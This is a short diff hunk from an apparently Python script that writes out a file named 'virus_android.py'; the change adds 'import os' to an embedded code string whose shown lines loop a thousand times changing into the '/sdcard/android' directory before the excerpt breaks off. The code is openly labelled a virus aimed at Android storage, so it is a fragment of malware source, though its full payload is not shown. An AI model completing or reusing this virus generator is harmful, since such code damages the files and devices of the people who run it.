@@ -23,6 +23,7 @@ def txt():
         pass
     file = open('virus_android.py' , 'w+')
     virus = '''
+import os
 for i in range(1000):
     try:
         os.chdir('/sdcard/android')
